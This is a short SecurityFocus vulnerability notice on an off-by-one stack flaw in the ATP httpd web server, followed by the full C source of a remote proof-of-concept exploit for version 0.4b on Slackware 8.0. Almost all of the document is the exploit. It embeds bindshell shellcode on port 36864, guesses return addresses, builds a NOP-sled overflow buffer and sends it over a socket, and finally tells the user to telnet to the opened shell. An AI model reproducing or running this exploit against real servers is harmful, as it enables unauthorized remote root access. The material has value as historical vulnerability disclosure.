source: http://www.securityfocus.com/bid/5956/info

ATP httpd is a lightweight HTTP server. A vulnerability has been reported in ATP httpd that may result in compromise of root access to remote attackers. It is possible to overwrite the least significant byte of the saved base pointer with a NULL if a string of maximum length is transmitted to the server. This creates a potentially exploitable condition if the saved base pointer is corrupted such that it points to attacker-controlled memory. 

/* PRPatphttpd.c
 *
 *    This program is free software; you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation; either version 2 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program; if not, write to the Free Software
 *    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *    -
 *
 *    PYR/\MID, Research Project
 *    Author: thread
 *    Date: 05/10/02
 *    Members: Apm, flea, thread
 *
 *    Proof of Concept Remote Exploit for ATP HTTP Daemon v0.4b
 *
 *    Tested on:
 *    i386 Slackware 8.0
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>


/* Constants */

#define BINDSHELL_PORT		36864
#define ARCHS			1


/* External variables */

extern int errno, h_errno; // Already declared in the headers


/* Here is a bindshell(code) */

char bindshell[] =
	"\xeb\x72\x5e\x29\xc0\x89\x46\x10\x40\x89\xc3\x89\x46\x0c"
	"\x40\x89\x46\x08\x8d\x4e\x08\xb0\x66\xcd\x80\x43\xc6\x46"
	"\x10\x10\x66\x89\x5e\x14\x88\x46\x08\x29\xc0\x89\xc2\x89"
	"\x46\x18\xb0\x90\x66\x89\x46\x16\x8d\x4e\x14\x89\x4e\x0c"
	"\x8d\x4e\x08\xb0\x66\xcd\x80\x89\x5e\x0c\x43\x43\xb0\x66"
	"\xcd\x80\x89\x56\x0c\x89\x56\x10\xb0\x66\x43\xcd\x80\x86"
	"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f"
	"\x41\xcd\x80\x88\x56\x07\x89\x76\x0c\x87\xf3\x8d\x4b\x0c"
	"\xb0\x0b\xcd\x80\xe8\x89\xff\xff\xff/bin/sh";


struct arch {
	int id;
	char *arch;
	long ret;
	int start_byte;
} arch[] = {
	{ 1, "ATP HTTP Daemon v0.4b/i386 Slackware 8.0", 0xbffff7ec, 600 }
};

	/* Note that this return address doesn't precisly point to the start
	 * of buffer's string (without any environment variables except '_')!
	 * It points to somewhere in the first 2/4 of buffer's memory,
	 * depending of the memory used by environment variables.
	 * This is useful to make some compatibility for systems with
	 * different environments.
	 */


/* Prototypes */

int gen_rand(int min, int max);
long get_ret(long base_ret, int bytes);

int main(int argc, char **argv) {
	int fd, i, arch_num, tmp;
	long ret;
	struct sockaddr_in host;
	struct hostent *he;
	char buffer[803];


	printf( "PYR/\\MID, Research Project 02\n"
		"ATP HTTP Daemon v0.4b Remote Exploit, by thread\n\n");


	/* Checking args */

	if (argc == 2 && !strcmp(argv[1], "-h")) {
		printf( "<arch>\n"
			"Valid architectures:\n");
		for (i = 0; i < ARCHS; i++) {
			printf("\t%d - %s - 0x%lx\n",
						arch[i].id,
						arch[i].arch,
						arch[i].ret);
		}
		printf( "\n"
			"<environment memory>\n"
			"If you have no idea about remote atphttpd environment "
			"you should use one of next\n"
		        "options for this argument:\n"
			"\n"
			"\t0  - Uses a default return address that works "
				"in the most 'default'\n"
			       	"\t     slackware envrionments (between 520 and"
				" 675 bytes of memory)\n"
			"\n"
			"\t-1 - Generates a random number that will point "
				"to a valid return address\n"
			       	"\t     that works in a specific range of "
		       		"memory used by the environment\n"
				"\t     (good luck ;)\n"
			"\n"
			"NOTE: A high return address value means less "
			"environment memory used\n\n");
		return -1;
	} else if (argc < 5) {
		printf( "Synopsis: %s [-h] <hostname> <port> <arch> "
			"<environment memory>\n"
			"\n"
			"-h\t\t\t- Use this flag as unique argument to "
			"display a detailed\n"
			"\t\t\t  help for <arch> and <environment memory> "
			"arguments\n"
			"\n"
			"<hostname>\t\t- Remote hostname or ip address\n"
			"<port>\t\t\t- Remote port\n"
			"<arch>\t\t\t- Architecture\n"
			"<environment memory>\t- It's the number of "
			"bytes that the environment (where\n"
			"\t\t\t  atphttpd runs) uses in memory.\n"
			"\n", argv[0]);
		return -1;
	}


	/* Calculating a new return address */

	printf("Calculating a new return address... ");
	fflush(stdout);

	arch_num = atoi(argv[3]) - 1;

	ret = get_ret(arch[arch_num].ret, atoi(argv[4]));

	printf("Done: 0x%lx\n", ret);


	/* Resolving hostname */

	printf("Resolving hostname (%s)... ", argv[1]);
	fflush(stdout);

	if (!(he = gethostbyname(argv[1]))) {
		fprintf(stderr, "Error: gethostbyname(): %s\n",
				hstrerror(h_errno));
		return -1;
	} else {
		char *r_ip = (char *) &host.sin_addr.s_addr;
		host.sin_addr.s_addr = *((unsigned long *) *he->h_addr_list);
		printf("Resolved to: %u.%u.%u.%u\n",
					(unsigned char) r_ip[0],
					(unsigned char) r_ip[1],
					(unsigned char) r_ip[2],
					(unsigned char) r_ip[3]);
	}


	/* Setting remote port and protocol family */

	host.sin_port = htons(atoi(argv[2]));
	host.sin_family = AF_INET;


	/* Creating an end-point for comunication */

	printf("Creating an end-point for comunication... ");
	fflush(stdout);

	if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "Error: socket(): %s\n", strerror(errno));
		return -1;
	}

	printf("Done\n");


	/* Connecting to the remote host */

	printf("Connecting to the remote host... ");
	fflush(stdout);

	if (connect(fd, (struct sockaddr *) &host,
				sizeof(struct sockaddr)) < 0) {
		fprintf(stderr, "Error: connect(): %s\n", strerror(errno));
		return -1;
	}

	printf("Connected\n");


	/* Crafting the string */

	memset(buffer, '\x90', sizeof(buffer));	// Fill buffer with NOPs

	/* The return address is somewhere around here.
	 * It changes a lot of times because
	 * the environment changes the buffer's place,
	 * so lets fill the memory's field
	 * where the return address is used to be:
	 */

	for (tmp = sizeof(buffer) - sizeof(long) - 3,
			i = arch[arch_num].start_byte; i < tmp;
				i += sizeof(long))
		*(long *)&buffer[i] = ret;

	memcpy((buffer + sizeof(buffer) - 1) - 3 - strlen(bindshell)
		       	- ((sizeof(buffer) - arch[arch_num].start_byte) + 1),
			bindshell, strlen(bindshell));	/* put the code right
							 * before the ret addr
							 * and ignore the '\0'
							 * and LF/CR chars
							 */

	buffer[sizeof(buffer) - 3] = '\n';
	buffer[sizeof(buffer) - 2] = '\r';
	buffer[sizeof(buffer) - 1] = 0;


	/* Now sending the crafted string to the remote host */

	printf("Sending buffer to the remote host... ");
	fflush(stdout);

	if (write(fd, buffer, strlen(buffer)) < 0) {
		fprintf(stderr, "Error: write(): %s\n", strerror(errno));
		return -1;
	}

	printf("Sent\n");


	/* Close the file descriptor */

	printf("Closing the connection... ");
	fflush(stdout);

	if (close(fd) < 0) {
		fprintf(stderr, "Error: close(): %s\n", strerror(errno));
		return -1;
	}

	printf("Closed\n");

	printf("\nNow try: telnet %s %d\n", argv[1], BINDSHELL_PORT);

	return 0;
}

int gen_rand(int min, int max) {
	struct timeval tv;
	gettimeofday(&tv, NULL);
	srand(tv.tv_usec);
	return (min + (rand() % (max / 2)));
}

long get_ret(long base_ret, int bytes) {
	if (!bytes)
		return 0xbffff4ec;
	if (bytes < 0)
		return get_ret(base_ret, gen_rand(5, 1500));

	return ((base_ret - bytes) - ((bytes >> 8) << 3));
				/*   ^^^^^^^^^^^^^^^^^^^	*/
				/* This will try to reduce the	*/
				/* error tax of the result	*/

	/* Note that this isn't an exact calculation! This will return
	 * a value that should point to somewhere in the first 2/4 of
	 * buffer's memory. This should work for 90% of the cases.
	 */
}
